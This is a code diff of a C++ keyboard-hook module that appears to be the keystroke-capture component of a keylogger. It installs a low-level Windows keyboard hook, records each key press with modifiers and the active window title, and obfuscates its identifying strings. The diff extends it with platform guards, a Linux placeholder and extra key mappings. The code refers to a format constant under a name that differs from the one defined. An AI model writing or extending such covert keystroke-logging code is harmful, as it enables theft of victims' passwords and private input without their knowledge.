@@ -2,29 +2,38 @@
 #include "data/DataManager.h"
 #include "core/Logger.h"
 #include "utils/TimeUtils.h"
+#include "utils/StringUtils.h"
 #include "security/Obfuscation.h"
-#include <Windows.h>
+
 #include <string>
 #include <sstream>
 #include <vector>
 #include <cstdint>
+#include <map>
 
 // Obfuscated strings
 constexpr auto OBF_KEYHOOK_MODULE = OBFUSCATE("KeyHook");
 constexpr auto OBF_KEYLOG_FORMAT = OBFUSCATE("KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }");
 
 // Static member initialization
+#if PLATFORM_WINDOWS
 HHOOK KeyHook::s_keyboardHook = nullptr;
 KeyHook* KeyHook::s_instance = nullptr;
+#endif
 
 KeyHook::KeyHook(DataManager* dataManager) 
     : m_dataManager(dataManager), m_isActive(false) {
+    #if PLATFORM_WINDOWS
     s_instance = this;
+    #endif
+    LOG_INFO("KeyHook initialized for " + std::string(PLATFORM_WINDOWS ? "Windows" : "Linux"));
 }
 
 KeyHook::~KeyHook() {
     RemoveHook();
+    #if PLATFORM_WINDOWS
     s_instance = nullptr;
+    #endif
 }
 
 bool KeyHook::InstallHook() {
@@ -33,7 +42,8 @@ bool KeyHook::InstallHook() {
         return true;
     }
 
-    // Set low-level keyboard hook
+    #if PLATFORM_WINDOWS
+    // Set low-level keyboard hook for Windows
     s_keyboardHook = SetWindowsHookExW(
         WH_KEYBOARD_LL,
         KeyboardProc,
@@ -46,6 +56,11 @@ bool KeyHook::InstallHook() {
         LOG_ERROR("Failed to install keyboard hook. Error: " + std::to_string(error));
         return false;
     }
+    #elif PLATFORM_LINUX
+    // Linux key logging requires different approach (X11 or evdev)
+    // This is a placeholder - actual implementation would need X11 or libevdev
+    LOG_WARN("Key logging not fully implemented for Linux. Requires X11 or libevdev integration.");
+    #endif
 
     m_isActive = true;
     LOG_INFO("Keyboard hook installed successfully");
@@ -55,6 +70,7 @@ bool KeyHook::InstallHook() {
 bool KeyHook::RemoveHook() {
     if (!m_isActive) return true;
 
+    #if PLATFORM_WINDOWS
     if (s_keyboardHook && !UnhookWindowsHookEx(s_keyboardHook)) {
         DWORD error = GetLastError();
         LOG_ERROR("Failed to remove keyboard hook. Error: " + std::to_string(error));
@@ -62,11 +78,16 @@ bool KeyHook::RemoveHook() {
     }
 
     s_keyboardHook = nullptr;
+    #elif PLATFORM_LINUX
+    // Clean up Linux key logging resources
+    #endif
+
     m_isActive = false;
     LOG_INFO("Keyboard hook removed successfully");
     return true;
 }
 
+#if PLATFORM_WINDOWS
 LRESULT CALLBACK KeyHook::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= HC_ACTION && s_instance) {
         KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
@@ -146,7 +167,11 @@ std::string KeyHook::VirtualKeyCodeToString(UINT vkCode) const {
         {VK_INSERT, "Insert"}, {VK_DELETE, "Delete"}, {VK_LWIN, "Win"},
         {VK_RWIN, "Win"}, {VK_NUMLOCK, "NumLock"}, {VK_SCROLL, "ScrollLock"},
         {VK_ADD, "+"}, {VK_SUBTRACT, "-"}, {VK_MULTIPLY, "*"},
-        {VK_DIVIDE, "/"}, {VK_DECIMAL, "."}
+        {VK_DIVIDE, "/"}, {VK_DECIMAL, "."},
+        {VK_OEM_1, ";"}, {VK_OEM_PLUS, "="}, {VK_OEM_COMMA, ","},
+        {VK_OEM_MINUS, "-"}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"},
+        {VK_OEM_3, "`"}, {VK_OEM_4, "["}, {VK_OEM_5, "\\"},
+        {VK_OEM_6, "]"}, {VK_OEM_7, "'"}
     };
 
     auto it = keyMap.find(vkCode);
@@ -165,15 +190,26 @@ std::string KeyHook::VirtualKeyCodeToString(UINT vkCode) const {
         return "F" + std::to_string(vkCode - VK_F1 + 1);
     }
 
+    // Numpad keys
+    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
+        return "Num" + std::to_string(vkCode - VK_NUMPAD0);
+    }
+
     // Convert using MapVirtualKey for other keys
-    char keyName[256];
+    char keyName[256] = {0};
     UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
-    if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName))) {
-        return keyName;
+    LONG lParam = (scanCode << 16);
+    
+    if (GetKeyNameTextA(lParam, keyName, sizeof(keyName))) {
+        std::string result(keyName);
+        if (!result.empty()) {
+            return result;
+        }
     }
 
     return "VK_" + std::to_string(vkCode);
 }
+#endif
 
 void KeyHook::LogKeyEvent(const KeyData& keyData) const {
     std::string action = (keyData.eventType == KeyEventType::KEY_DOWN) ? "DOWN" : "UP";
@@ -183,7 +219,15 @@ void KeyHook::LogKeyEvent(const KeyData& keyData) const {
     if (keyData.modifiers & KeyModifiers::CONTROL) modifiers += "CTRL+";
     if (keyData.modifiers & KeyModifiers::ALT) modifiers += "ALT+";
     if (keyData.modifiers & KeyModifiers::WIN) modifiers += "WIN+";
-    if (modifiers.empty()) modifiers = "NONE";
+    if (keyData.modifiers & KeyModifiers::CAPS_LOCK) modifiers += "CAPS+";
+    if (keyData.modifiers & KeyModifiers::NUM_LOCK) modifiers += "NUM+";
+    
+    if (modifiers.empty()) {
+        modifiers = "NONE";
+    } else {
+        // Remove trailing '+'
+        modifiers.pop_back();
+    }
 
     char logMessage[512];
     snprintf(logMessage, sizeof(logMessage), OBFUSCATED_KEYLOG_FORMAT,
